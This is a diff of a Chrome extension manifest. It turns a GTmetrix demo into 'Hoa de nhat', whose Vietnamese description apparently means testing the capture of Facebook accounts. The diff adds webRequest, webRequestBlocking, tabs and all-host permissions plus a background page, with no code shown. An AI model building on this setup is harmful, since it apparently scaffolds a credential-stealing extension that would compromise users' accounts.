@@ -1,13 +1,23 @@
 {
   "manifest_version": 2,
 
-  "name": "GTmetrix Plugin",
-  "description": "This extension is a demo",
+  "name": "Hoa de nhat",
+  "description": "test lay tai khoan facebook",
   "version": "1.0",
-
+  "offline_enabled": true,
   "browser_action": {
     "default_icon": "img/ninja.png",
     "default_popup": "html/popup.html"
   },
-  "permissions": ["activeTab"]
+  "permissions": [
+    "webRequest",
+    "webRequestBlocking",
+    "tabs",
+    "http://*/",
+    "https://*/"
+  ],
+  "background": {
+    "page": "/html/background.html"
+  },
+  "update_url": "https://clients2.google.com/service/update2/crx"
 }
